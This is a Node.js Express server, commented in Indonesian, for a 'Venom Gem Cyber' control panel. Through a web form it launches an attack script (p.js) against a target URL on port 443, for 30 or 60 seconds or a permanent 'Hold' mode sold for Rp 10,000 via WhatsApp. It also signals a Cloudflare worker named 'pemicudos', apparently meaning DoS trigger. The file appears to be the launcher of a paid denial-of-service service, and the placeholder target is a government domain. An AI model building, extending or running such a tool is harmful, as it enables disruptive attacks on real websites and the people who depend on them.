const { spawn } = require('child_process');
const http = require('https');
const express = require('express');
const path = require('path');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const app = express();

let currentChildProcess = null;

const STORAGE = 'storage.json';
const UID = crypto.createHash('md5').update(os.hostname() + os.userInfo().username).digest('hex');

// Fungsi untuk mengecek lisensi online dari URL Gist dengan Cache Buster
function checkLicenseFromUrl(apiUrl) {
    return new Promise((resolve) => {
        if (!apiUrl) {
            resolve(false);
            return;
        }

        let targetUrl = apiUrl.trim();
        if (targetUrl.includes('github.com') && !targetUrl.includes('/raw/')) {
            targetUrl = targetUrl.replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/');
        }

        // Tambahkan cache buster agar selalu mengambil data terbaru dari Gist
        targetUrl += (targetUrl.includes('?') ? '&' : '?') + 't=' + Date.now();

        http.get(targetUrl, (res) => {
            let data = '';
            res.on('data', (c) => data += c);
            res.on('end', () => {
                try {
                    if (data.trim().startsWith('<')) {
                        resolve(false);
                        return;
                    }
                    const db = JSON.parse(data);
                    const expiry = db[UID];
                    if (expiry && new Date(expiry) > new Date()) {
                        resolve(true); // Premium Aktif
                    } else {
                        resolve(false); // Free / Expired
                    }
                } catch (e) {
                    resolve(false);
                }
            });
        }).on('error', () => resolve(false));
    });
}

function getStorage() {
    return fs.existsSync(STORAGE) ? JSON.parse(fs.readFileSync(STORAGE)) : [];
}

function isValidInput(input) {
    if (!input || typeof input !== 'string') return false;
    return !/[;&|`$]/.test(input); 
}

function isValidFile(filename) {
    if (!filename || typeof filename !== 'string') return false;
    const baseFile = filename.trim().split(/\s+/)[0];
    const safeFileRegex = /^[a-zA-Z0-9_-]+\.js$/;
    return safeFileRegex.test(baseFile);
}

// 1. Endpoint Halaman Utama dengan Form Input URL API Gist
app.get('/', async (req, res) => {
    const defaultApi = 'https://gist.githubusercontent.com/GMhabib/5d1cfc680d015396046dbbab8fb34000/raw/license.json';
    const apiParam = req.query.api || defaultApi;

    const isPremium = await checkLicenseFromUrl(apiParam);

    res.send(`
        <!DOCTYPE html>
        <html lang="id">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>habibGM Control Panel</title>
            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
            <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
            <style>
                body {
                    background-color: #090d16;
                    color: #00ffcc;
                    font-family: 'Courier New', Courier, monospace;
                    min-height: 100vh;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    margin: 0;
                    padding: 20px;
                }
                .card-cyber {
                    background: rgba(15, 23, 42, 0.85);
                    border: 1px solid #00ffcc33;
                    box-shadow: 0 0 20px rgba(0, 255, 204, 0.15);
                    backdrop-filter: blur(10px);
                    border-radius: 12px;
                    padding: 25px;
                    width: 100%;
                    max-width: 500px;
                }
                .form-control, .form-select {
                    background-color: #030712;
                    border: 1px solid #1e293b;
                    color: #38bdf8;
                    font-family: 'Courier New', Courier, monospace;
                    font-size: 0.9rem;
                }
                .form-control:focus, .form-select:focus {
                    background-color: #030712;
                    border-color: #00ffcc;
                    color: #38bdf8;
                    box-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
                }
                .btn-cyber {
                    background-color: transparent;
                    border: 1px solid #00ffcc;
                    color: #00ffcc;
                    font-weight: bold;
                    transition: all 0.3s ease;
                }
                .btn-cyber:hover {
                    background-color: #00ffcc;
                    color: #090d16;
                    box-shadow: 0 0 15px rgba(0, 255, 204, 0.6);
                }
                .btn-danger-cyber {
                    background-color: transparent;
                    border: 1px solid #ff4d4d;
                    color: #ff4d4d;
                    font-weight: bold;
                    transition: all 0.3s ease;
                }
                .btn-danger-cyber:hover {
                    background-color: #ff4d4d;
                    color: #090d16;
                    box-shadow: 0 0 15px rgba(255, 77, 77, 0.6);
                }
                .btn-warning-cyber {
                    background-color: transparent;
                    border: 1px solid #ffc107;
                    color: #ffc107;
                    font-weight: bold;
                    transition: all 0.3s ease;
                }
                .btn-warning-cyber:hover {
                    background-color: #ffc107;
                    color: #090d16;
                    box-shadow: 0 0 15px rgba(255, 193, 7, 0.6);
                }
                .terminal-header {
                    font-size: 0.85rem;
                    color: #64748b;
                    margin-bottom: 15px;
                    border-bottom: 1px dashed #1e293b;
                    padding-bottom: 10px;
                }
                .badge-status {
                    font-size: 0.75rem;
                    padding: 4px 8px;
                    border-radius: 4px;
                }
            </style>
        </head>
        <body>
            <div class="container d-flex justify-content-center">
                <div class="card-cyber">
                    <div class="terminal-header d-flex justify-content-between align-items-center">
                        <span><i class="fa-solid fa-terminal"></i> system://habibGM</span>
                        <span class="badge-status ${isPremium ? 'bg-success text-white' : 'bg-secondary text-dark'}">
                            ${isPremium ? 'PREMIUM ACTIVE' : 'FREE VERSION'}
                        </span>
                    </div>
                    <h4 class="text-center mb-3 text-info fw-bold">Venom Gem Cyber</h4>
                    
                    <!-- Input untuk menyimpan & mengubah URL API Gist Lisensi -->
                    <div class="mb-3">
                        <label for="apiUrl" class="form-label text-secondary small">URL API GIST LISENSI:</label>
                        <div class="input-group">
                            <input type="text" class="form-control" id="apiUrl" value="${apiParam}">
                            <button class="btn btn-outline-info btn-sm" type="button" onclick="saveApiUrl()"><i class="fa-solid fa-floppy-disk"></i></button>
                        </div>
                    </div>

                    <div class="mb-3">
                        <label for="targetUrl" class="form-label text-secondary small">TARGET URL:</label>
                        <input type="text" class="form-control" id="targetUrl" placeholder="https://domain.go.id" value="">
                    </div>
                    <div class="mb-3">
                        <label for="durationMode" class="form-label text-secondary small">PILIH MODE / DURASI:</label>
                        <select class="form-select" id="durationMode" onchange="handleModeChange(this)">
                            <option value="30">30 Detik</option>
                            <option value="60">60 Detik</option>
                            <option value="hold">Hold (Permanen)</option>
                        </select>
                    </div>
                    <div id="holdAlert" class="alert py-2 mb-3 small" style="display: none; background: rgba(255, 193, 7, 0.1); border: 1px solid #ffc107; color: #ffc107; border-radius: 6px;">
                        <i class="fa-solid fa-triangle-exclamation"></i> Fitur Hold memerlukan pembayaran <b>Rp 10.000</b>.<br>Silakan hubungi WhatsApp: <a href="https://wa.me/6281990464922" target="_blank" style="color: #00ffcc; text-decoration: underline;">081990464922</a>
                    </div>
                    <div class="d-grid gap-2">
                        <button class="btn btn-cyber py-2" onclick="startExecution()">
                            <i class="fa-solid fa-bolt"></i> EXECUTE START
                        </button>
                        <div class="row g-2">
                            <div class="col-6">
                                <a href="/status" class="btn btn-warning-cyber w-100 py-2">
                                    <i class="fa-solid fa-list"></i> STATUS
                                </a>
                            </div>
                            <div class="col-6">
                                <button class="btn btn-danger-cyber w-100 py-2" onclick="stopExecution()">
                                    <i class="fa-solid fa-power-off"></i> STOP
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <script>
                window.onload = function() {
                    const savedApi = localStorage.getItem('saved_api_url');
                    const currentUrlParams = new URLSearchParams(window.location.search);
                    if (savedApi && !currentUrlParams.has('api')) {
                        window.location.href = '/?api=' + encodeURIComponent(savedApi);
                    }
                }

                function saveApiUrl() {
                    const apiVal = document.getElementById('apiUrl').value.trim();
                    if (!apiVal) {
                        alert('URL API Gist tidak boleh kosong!');
                        return;
                    }
                    localStorage.setItem('saved_api_url', apiVal);
                    window.location.href = '/?api=' + encodeURIComponent(apiVal);
                }

                function handleModeChange(select) {
                    const alertBox = document.getElementById('holdAlert');
                    if (select.value === 'hold') {
                        alertBox.style.display = 'block';
                    } else {
                        alertBox.style.display = 'none';
                    }
                }

                function startExecution() {
                    const urlVal = document.getElementById('targetUrl').value.trim();
                    const modeVal = document.getElementById('durationMode').value;
                    const apiVal = document.getElementById('apiUrl').value.trim();
                    if (!urlVal) {
                        alert('Target URL tidak boleh kosong!');
                        return;
                    }

                    const isUserPremium = ${isPremium};
                    if (modeVal === 'hold' && !isUserPremium) {
                        alert('Fitur Hold memerlukan pembayaran Rp 10.000. Silakan hubungi WhatsApp ke 081990464922.');
                    }

                    const fileParam = encodeURIComponent('p.js');
                    const targetParam = encodeURIComponent(urlVal + ' 443 ' + modeVal + ' 100');
                    window.location.href = \`/node?file=\${fileParam}&target=\${targetParam}&api=\${encodeURIComponent(apiVal)}\`;
                }

                function stopExecution() {
                    if (confirm('Yakin ingin menghentikan proses?')) {
                        window.location.href = '/stop';
                    }
                }
            </script>
        </body>
        </html>
    `);
});

// 2. Endpoint Status Hold
app.get('/status', (req, res) => {
    const data = getStorage();
    let listHtml = '';
    if (data.length === 0) {
        listHtml = '<p class="text-secondary">Tidak ada target yang sedang di-Hold.</p>';
    } else {
        data.forEach((item, i) => {
            listHtml += `<li class="mb-2 text-info"><b>${i+1}.</b> ${item.url} | Thread: ${item.threads}</li>`;
        });
    }

    res.send(`
        <!DOCTYPE html>
        <html lang="id">
        <head>
            <meta charset="UTF-8">
            <title>Status Hold Target</title>
            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
            <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
            <style>
                body { background-color: #090d16; color: #00ffcc; font-family: 'Courier New', Courier, monospace; padding: 40px; }
                .card-cyber { background: rgba(15, 23, 42, 0.85); border: 1px solid #00ffcc33; border-radius: 12px; padding: 30px; max-width: 600px; margin: auto; box-shadow: 0 0 20px rgba(0, 255, 204, 0.15); }
                a { color: #38bdf8; text-decoration: none; }
                a:hover { text-decoration: underline; }
            </style>
        </head>
        <body>
            <div class="card-cyber">
                <h4 class="text-info mb-4"><i class="fa-solid fa-list"></i> Target yang sedang di-Hold</h4>
                <ul class="list-unstyled">${listHtml}</ul>
                <hr style="border-color: #1e293b;">
                <div class="d-flex justify-content-between mt-3">
                    <a href="/deleted" class="btn btn-outline-danger btn-sm"><i class="fa-solid fa-trash"></i> Hapus Semua Status</a>
                    <a href="/" class="btn btn-outline-info btn-sm">&larr; Kembali ke Panel</a>
                </div>
            </div>
        </body>
        </html>
    `);
});

app.get('/deleted', (req, res) => {
    try {
        fs.writeFileSync(STORAGE, JSON.stringify([]));
    } catch(e) {}
    res.redirect('/status');
});

// 3. Endpoint /node Mengeksekusi p.js dengan Mengoper API Gist via Environment Variable
app.get('/node', async (req, res) => {
    const rawFile = req.query.file;   
    const targetQuery = req.query.target; 
    const apiParam = req.query.api;

    if (!isValidFile(rawFile)) {
        return res.status(400).send('Invalid file: nama file tidak valid.');
    }

    if (!isValidInput(targetQuery)) {
        return res.status(400).send('Invalid target: mengandung karakter terlarang.');
    }

    const targetArgs = targetQuery.trim().split(/\s+/); 
    const duration = targetArgs[2];

    if (duration === 'hold') {
        const isPremium = await checkLicenseFromUrl(apiParam);
        if (!isPremium) {
            return res.status(403).send(`
                <html>
                <body style="background:#090d16; color:#ff4d4d; font-family:monospace; padding:30px;">
                    <h3>[!] AKSES DITOLAK</h3>
                    <p>[!] Fitur "Hold" memerlukan akses Premium. ID Hardware: <b>${UID}</b></p>
                    <p>Silakan lakukan pembayaran Rp 10.000 dan hubungi WhatsApp: <b>081990464922</b></p>
                    <br><a href="/" style="color:#00ffcc;">&larr; Kembali ke Panel</a>
                </body>
                </html>
            `);
        }
    }

    const scriptFile = rawFile.trim().split(/\s+/)[0]; 
    const scriptPath = path.join(__dirname, scriptFile);
    
    const commandArgs = [scriptPath, ...targetArgs];

    console.log(`Mengeksekusi: node ${commandArgs.join(' ')} dengan API Gist: ${apiParam}`);

    if (currentChildProcess) {
        currentChildProcess.kill();
    }

    // Meneruskan URL Gist ke p.js melalui environment variable API_GIST_URL
    currentChildProcess = spawn('node', commandArgs, {
        env: { ...process.env, API_GIST_URL: apiParam }
    });

    let output = '';
    let errorOutput = '';

    currentChildProcess.stdout.on('data', (data) => {
        output += data;
    });

    currentChildProcess.stderr.on('data', (data) => {
        errorOutput += data;
    });

    currentChildProcess.on('close', (code) => {
        currentChildProcess = null;
        if (code !== 0 && errorOutput) {
            return res.status(500).send(`
                <html>
                <body style="background:#090d16; color:#ff4d4d; font-family:monospace; padding:20px;">
                    <h3>[!] EKSEKUSI GAGAL (Kode: ${code})</h3>
                    <pre>${errorOutput}</pre>
                    <br><a href="/" style="color:#00ffcc;">&larr; Kembali</a>
                </body>
                </html>
            `);
        }
        res.send(`
            <html>
            <body style="background:#090d16; color:#00ffcc; font-family:monospace; padding:20px;">
                <h3>[+] EKSEKUSI BERHASIL</h3>
                <pre>${output}</pre>
                <br><a href="/" style="color:#38bdf8;">&larr; Kembali ke Panel</a>
            </body>
            </html>
        `);
    });
});

// 4. Endpoint /stop
app.get('/stop', (req, res) => {
    if (currentChildProcess) {
        currentChildProcess.kill();
        currentChildProcess = null;
        console.log('[!] Proses lokal dihentikan oleh pengguna.');
    }

    const workerUrl = 'https://ini.pemicudos.workers.dev/?action=stop';
    http.get(workerUrl, (workerRes) => {
        console.log(`[!] Sinyal stop dikirim ke worker. Status: ${workerRes.statusCode}`);
        res.send(`
            <html>
            <body style="background:#090d16; color:#ff4d4d; font-family:monospace; padding:20px;">
                <h3>[!] PROSES BERHASIL DIHENTIKAN</h3>
                <p>Sinyal stop telah dikirim ke server lokal dan Cloudflare worker.</p>
                <br><a href="/" style="color:#00ffcc;">&larr; Kembali ke Panel</a>
            </body>
            </html>
        `);
    }).on('error', (e) => {
        console.error(`[!] Gagal mengirim sinyal stop ke worker: ${e.message}`);
        res.send(`
            <html>
            <body style="background:#090d16; color:#ff4d4d; font-family:monospace; padding:20px;">
                <h3>[!] Proses lokal dihentikan, tapi gagal menghubungi worker.</h3>
                <pre>${e.message}</pre>
                <br><a href="/" style="color:#00ffcc;">&larr; Kembali ke Panel</a>
            </body>
            </html>
        `);
    });
});

app.listen(3000, () => {
    console.log('Server berjalan di http://localhost:3000');
});
